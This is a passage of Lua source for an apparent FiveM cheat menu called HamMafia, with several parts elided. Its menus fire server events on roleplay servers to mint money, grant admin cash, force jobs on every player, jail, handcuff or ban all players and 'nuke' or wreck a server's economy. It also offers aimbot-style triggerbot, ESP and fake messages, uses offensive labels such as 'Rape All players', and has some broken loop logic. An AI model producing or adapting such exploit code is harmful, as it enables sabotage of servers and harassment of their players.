                for dK, em in pairs(bu) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('VehicleMenu') then
                if HamMafia.MenuButton('~h~~p~#~s~ ~h~~b~LSC ~s~Customs', 'LSC') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ Vehicle ~g~Boost', 'BoostMenu') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ Vehicle List', 'CarTypes') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ Global Car Trolls', 'GCT') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ Spawn & Attach ~s~Trailer', 'MainTrailer') then
                elseif HamMafia.Button('~h~Spawn ~r~Custom ~s~Vehicle') then
                    ca()
                elseif HamMafia.Button('~h~~r~Delete ~s~Vehicle') then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif HamMafia.Button('~h~~g~Repair ~s~Vehicle') then
                    cc()
                elseif HamMafia.Button('~h~~g~Repair ~s~Engine') then
                    cd()
                elseif HamMafia.Button('~h~~g~Flip ~s~Vehicle') then
                    daojosdinpatpemata()
                elseif HamMafia.Button('~h~~b~Max ~s~Tuning') then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif HamMafia.Button('~h~~g~RC ~s~Car') then
                    ce()
                    HamMafia.CloseMenu()
                elseif
                    HamMafia.CheckBox(
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('GCT') then
                if
                    HamMafia.CheckBox(
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('LuaMenu') then
                if HamMafia.MenuButton('~h~~p~#~s~ ~r~ESX ~s~Boss', 'ESXBoss') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ ~r~ESX ~s~Money', 'ESXMoney') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ ~r~ESX ~s~Prace', 'ESXJobs') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ ~r~ESX ~s~Misc', 'ESXCustom') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ ~r~ESX ~s~Money Menu by HamMafia', 'ESXDrugs') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ ~r~Admin ~s~Master by HamMafia', 'ESXAdmin') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ ~y~VRP ~s~Triggers', 'VRPTriggers') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ ~b~Misc ~s~Triggers', 'MiscTriggers') then
                end
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('ESXJobs') then
                if HamMafia.Button('~h~Bezrobotny') then
                    for ak = 0, 256 do
                        TriggerServerEvent('NB:destituerplayer', GetPlayerServerId(ak))
                        TriggerServerEvent('NB:destituerplayer', GetPlayerServerId(i))
						TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), 'unemployed', 0)
                        UnemployedPlayers()
                    end
                elseif HamMafia.Button('~h~Set all ~b~Police ~s~Job') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'police', 3)
                        PolicePlayers()
                    end
                elseif HamMafia.Button('~h~Set all ~o~Mecano ~s~Job') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'mecano', 3)
                        MecanoPlayers()
                    end
                elseif HamMafia.Button('~h~Set all ~y~Taxi ~s~Job') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'taxi', 3)
                        TaxiPlayers()
                    end
                elseif HamMafia.Button('~h~Set all ~r~Ambulance ~s~Job') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'ambulance', 3)
                        AmbulancePlayers()
                    end
                elseif HamMafia.Button('~h~Set all ~g~Real Estate ~s~Job') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'realestateagent', 3)
                        RealEstateAgentPlayers()
                    end
                elseif HamMafia.Button('~h~Set all ~r~Car ~b~Dealer ~s~Job') then
                    for ak = 0, 128 do
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('ESXBoss') then
                if HamMafia.Button('~c~~h~Mechanic~s~ Boss Menu') then
                    TriggerEvent(
                    ...
                    HamMafia.CloseMenu()
                elseif HamMafia.Button('~b~~h~Police~s~ Boss Menu') then
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'police',
                        function(en, eo)
                    ...
                    HamMafia.CloseMenu()
                elseif HamMafia.Button('~r~~h~Ambulance~s~ Boss Menu') then
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'ambulance',
                        function(en, eo)
                    ...
                    HamMafia.CloseMenu()
                elseif HamMafia.Button('~y~~h~Taxi~s~ Boss Menu') then
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'taxi',
                        function(en, eo)
                    ...
                    HamMafia.CloseMenu()
                elseif HamMafia.Button('~g~~h~Real Estate~s~ Boss Menu') then
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'realestateagent',
                        function(en, eo)
                    ...
                    HamMafia.CloseMenu()
                elseif HamMafia.Button('~o~~h~Car Dealer~s~ Boss Menu') then
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'cardealer',
                        function(en, eo)
                    ...
                    HamMafia.CloseMenu()
                elseif HamMafia.Button('~y~~h~Custom~s~ Boss Menu') then
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('ESXMoney') then
                if HamMafia.Button('~h~~o~Automatic Money ~r~ WARNING!') then
                    automaticmoneyesx()
                elseif HamMafia.Button('~g~~h~ESX ~y~Caution Give Back') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_jobs:caution', 'give_back', m)
                    end
                elseif HamMafia.Button('~g~~h~ESX ~y~Eden Garage') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                ...
                elseif HamMafia.Button('~g~~h~ESX ~y~Fuel Delivery') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_fueldelivery:pay', m)
                    end
                elseif HamMafia.Button('~g~~h~ESX ~y~Car Thief') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_carthief:pay', m)
                    end
                elseif HamMafia.Button('~g~~h~ESX ~y~DMV School') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'esx_dmvschool:pay',
                ...
                elseif HamMafia.Button('~g~~h~FUEL ~y~Legacy Fuel') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'LegacyFuel:PayFuel',
                ...
                elseif HamMafia.Button('~g~~h~ESX ~y~Dirty Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_godirtyjob:pay', m)
                    end
                elseif HamMafia.Button('~g~~h~ESX ~y~Pizza Boy') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_pizza:pay', m)
                    end
                elseif HamMafia.Button('~g~~h~ESX ~y~Ranger Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_ranger:pay', m)
                    end
                elseif HamMafia.Button('~g~~h~ESX ~y~Garbage Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_garbagejob:pay', m)
                    end
                elseif HamMafia.Button('~g~~h~ESX ~y~Car Thief ~r~DIRTY MONEY') then
                    local m = KeyboardInput('Enter amount of dirty money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_carthief:pay', m)
                    end
                elseif HamMafia.Button('~g~~h~ESX ~y~Trucker Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_truckerjob:pay', m)
                    end
                elseif HamMafia.Button('~g~~h~ESX ~y~Admin Give Bank') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('AdminMenu:giveBank', m)
                    end
                elseif HamMafia.Button('~g~~h~ESX ~y~Admin Give Cash') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('AdminMenu:giveCash', m)
                    end
                elseif HamMafia.Button('~g~~h~ESX ~y~Postal Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_gopostaljob:pay', m)
                    end
                elseif HamMafia.Button('~g~~h~ESX ~y~Banker Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_banksecurity:pay', m)
                    end
                elseif HamMafia.Button('~g~~h~ESX ~y~Slot Machine') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_slotmachine:sv:2', m)
                    end
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('ESXCustom') then
                if HamMafia.Button('~w~~h~Set hunger to ~h~~g~100') then
                    TriggerEvent('esx_status:set', 'hunger', 1000000)
                elseif HamMafia.Button('~w~~h~Set thirst to ~h~~g~100') then
                    TriggerEvent('esx_status:set', 'thirst', 1000000)
                elseif HamMafia.Button('~g~~h~ESX ~r~Revive') then
                ...
                elseif HamMafia.Button('~g~~h~ESX ~b~Handcuff') then
                    local f = KeyboardInput('Enter Player ID or all', '', 1000)
                    if f then
                        if f == 'all' then
                            for i = 0, 128 do
                ...
                elseif HamMafia.Button('~h~Get Driving License') then
                    TriggerServerEvent('esx_dmvschool:addLicense', 'dmv')
                    TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
                elseif HamMafia.Button('~h~~b~Buy ~s~a vehicle for ~g~free') then
                    cv()
                end
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('ESXDrugs') then
                if HamMafia.Button('~h~~g~Vine ~g~WoodRP') then
                    vinewood()
				elseif HamMafia.Button('~h~~g~RLIFE ~g~RP') then
                    rlife()
				elseif HamMafia.Button('~h~~g~POLSTAR ~g~RP') then
                    tweed()
                elseif
                    HamMafia.CheckBox(
                        '~h~~r~XDDDDD ~y~XDDDDD!',
                ...
                HamMafia.Display() 
				elseif HamMafia.IsMenuOpened('ESXAdmin') then
                if HamMafia.Button('~h~~g~ZARTOWALEM KURWUHAUHASUHUHAUUA') then
                    adminm()
                elseif HamMafia.Button('~h~~g~ZARTOWALEM KURWUHAUHASUHUHAUUA') then
                    twee2d()
                elseif
                    HamMafia.CheckBox(
                        '~h~~r~XDDDDDDDDD ~y~XDDDDDDDD!',
                        BlowDrugsUp,
                        function(dR)
                            BlowDrugsUp = dR
                        end
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('VRPTriggers') then
                if HamMafia.Button('~r~~h~VRP ~s~Give Money ~ypayGarage') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'lscustoms:payGarage',
                ...
                elseif HamMafia.Button('~r~~h~VRP ~g~WIN ~s~Slot Machine') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                ...
                elseif HamMafia.Button('~r~~h~VRP ~s~Get driving license') then
                    TriggerServerEvent('dmv:success')
                elseif HamMafia.Button('~r~~h~VRP ~s~Bank Deposit') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('Banca:deposit', m)
                        TriggerServerEvent('bank:deposit', m)
                    end
                elseif HamMafia.Button('~r~~h~VRP ~s~Bank Withdraw ') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('MiscTriggers') then
                if HamMafia.Button('~h~Send Discord Message') then
                ...
                elseif HamMafia.Button('~h~Send Fake Message') then
                ...
                elseif HamMafia.Button('~h~~g~ESX ~y~CarThief ~s~TROLL') then
                    av('~y~esx_carthief ~g~required', true)
                    av('~g~Trying to send alerts', false)
                    carthieftroll()
                end
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('AdvM') then
                if HamMafia.MenuButton('~h~~p~#~s~ Destroyer Menu', 'Destroyer') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ ESP Menu', 'ESPMenu') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ Crosshairs', 'CsMenu') then
                elseif
                    HamMafia.CheckBox(
                        '~h~TriggerBot',
                        TriggerBot,
                ...
                elseif
                 ...
                 then
                elseif HamMafia.Button('~h~~r~BORGAR~s~ Everyone') then
                    for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = GetHashKey(eb)
                ...
                elseif HamMafia.Button('~h~~o~Discord RPC~s~ Add/Remove') then
                    h = not h
                    if not h then
                        SetRichPresence(0)
                        SetDiscordAppId(0)
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('CsMenu') then
                if
                    HamMafia.CheckBox(
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('Destroyer') then
                if HamMafia.Button('~h~~r~Hehe ~s~xdddd') then
                    nukeserver()
                elseif
                    HamMafia.CheckBox(
                 ...
                 then
                elseif HamMafia.Button('~h~~g~Ban All ~r~Destroy ~b~v2') then
                    esxdestroyv2()
                elseif HamMafia.Button('~h~~g~ESX ~r~Economy ~b~fucker') then
                    EconomyDy2()
                elseif HamMafia.Button('~h~~r~VRP ~s~Give everyone money') then
                    vrpdestroy()
                elseif HamMafia.Button('~h~~g~ESX ~s~Rozpierdalator ') then
                    giveeveryone()
                elseif HamMafia.Button('~h~~r~Jail~s~ All players') then
                    for i = 0, 256 do
                TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayerIdx), 45 * 60)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(selectedPlayerIdx), 45 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(selectedPlayerIdx), 45 * 60, "dude weed")			
                ...
                elseif HamMafia.Button('~h~~r~Banana ~p~Party~s~ All players') then
                    bananapartyall()
                elseif HamMafia.Button('~h~~r~Rape~s~ All players') then
                    RapeAllFunc()
                elseif HamMafia.Button('~h~~r~Cage~s~ All players') then
                    for i = 0, 255 do
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('crds') then
                if HamMafia.Button('~h~~p~#~s~ XDXDXD ~p~DEV') then
                    av('~h~~o~XDXDXD!~s~.', false)
                    av('XDXDXDXD?', false)
                    av('XDXDXDXD', false)
                elseif HamMafia.Button('~h~~p~#~s~ XDXDXD ~p~DEV') then
                elseif HamMafia.Button('~h~~p~#~s~ XDXDXD ~p~DEV') then
                end
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('WeaponTypes') then
                for e0, ev in pairs(b7) do
                    if HamMafia.MenuButton('~h~~p~#~s~ ' .. e0, 'WeaponTypeSelection') then
                        dy = ev
                    end
                end
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('WeaponTypeSelection') then
                for e0, ev in pairs(dy) do
                    if HamMafia.MenuButton(ev.name, 'WeaponOptions') then
                        dz = ev
                    end
                end
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('WeaponOptions') then
                if HamMafia.Button('~h~~r~Spawn Weapon') then
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(dz.id), 1000, false)
                end
                if HamMafia.Button('~h~~g~Add Ammo') then
                ...
                for e0, ev in pairs(dz.mods) do
                    if HamMafia.MenuButton('~h~~p~#~s~ ~h~~r~> ~s~' .. e0, 'ModSelect') then
                        dA = ev
                    end
                end
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('ModSelect') then
                for _, ev in pairs(dA) do
                    if HamMafia.Button(ev.name) then
                        GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(dz.id), GetHashKey(ev.id))
                    end
                end
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('CarTypes') then
                for i, ex in ipairs(b3) do
                    if HamMafia.MenuButton('~h~~p~#~s~ ' .. ex, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('CarTypeSelection') then
                for i, ex in ipairs(b4[carTypeIdx]) do
                    if HamMafia.MenuButton('~h~~p~#~s~ ~h~~r~>~s~ ' .. ex, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('CarOptions') then
                if HamMafia.Button('~h~~r~Spawn Car') then
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('MainTrailer') then
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                    for i, ex in ipairs(b5) do
                        if HamMafia.MenuButton('~h~~p~#~s~ ~h~~r~>~s~ ' .. ex, 'MainTrailerSpa') then
                            TrailerToSpawn = i
                        end
                    end
                else
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('MainTrailerSpa') then
                if HamMafia.Button('~h~~r~Spawn Car') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('GiveSingleWeaponPlayer') then
                for i = 1, #b6 do
                    if HamMafia.Button(b6[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(b6[i]), 1000, false, true)
                    end
                end
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('ESPMenu') then
                if
                    HamMafia.CheckBox(
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('LSC') then
                local veh = GetVehiclePedIsUsing(PlayerPedId())
                if HamMafia.MenuButton('~h~~p~#~s~ ~h~~r~Exterior ~s~Tuning', 'tunings') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ ~h~~r~Performance ~s~Tuning', 'performance') then
                elseif HamMafia.Button('~h~Change Car License Plate') then
                    cu()
                elseif
                    HamMafia.CheckBox(
                 ...
                 then
                elseif HamMafia.Button('~h~Make vehicle ~y~dirty') then
                    Clean(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif HamMafia.Button('~h~Make vehicle ~g~clean') then
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('BoostMenu') then
                if
                    HamMafia.ComboBox(
